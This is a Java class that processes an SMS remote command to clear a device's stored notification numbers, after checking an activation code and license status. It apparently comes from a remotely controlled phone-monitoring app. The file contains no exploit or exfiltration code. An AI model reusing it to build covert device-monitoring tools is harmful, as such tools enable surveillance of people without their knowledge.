package com.vvt.remotecommandmanager.processor.notificationsnumbers;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.preference_manager.PrefNotificationNumber;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceType;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class ClearNotificationNumbersProcessor extends RemoteCommandProcessor {
	private static final String TAG = "ClearNotificationNumbersProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private PreferenceManager mPreferenceManager;
	private LicenseInfo mLicenseInfo;
	private StringBuilder mReplyMessageBuilder;
	
	public ClearNotificationNumbersProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, PreferenceManager preferenceManager) {
		super(appContext, eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mPreferenceManager = preferenceManager;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}
	
	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ... ");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
	 	try	 {
	 		
			PrefNotificationNumber notificationNumber = (PrefNotificationNumber) mPreferenceManager
					.getPreference(PreferenceType.NOTIFICATION_NUMBER);
			if(LOGV) FxLog.v(TAG, "doProcessCommand #Before clear notificationNumber : " + notificationNumber.getNotificationNumber().toString());
			notificationNumber.clearNotificationNumber();
			if(LOGD) FxLog.d(TAG, "doProcessCommand #After clear notificationNumber : " + notificationNumber.getNotificationNumber().toString());
			mPreferenceManager.savePreferenceAndNotifyChange(notificationNumber);
			
			mReplyMessage.setIsSuccess(true);
			mReplyMessageBuilder.append(MessageManager.CLEAR_NOTIFICATION_SUCCESS);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
			
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(MessageManager.CLEAR_NOTIFICATION_ERROR);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		if(LOGV) FxLog.v(TAG, "doProcessCommand # isSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ... ");
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			//Command should only have 1 or 2 (<D>) arguments.
			if(commandData.getArguments().size() != 1 ) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}


	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

}
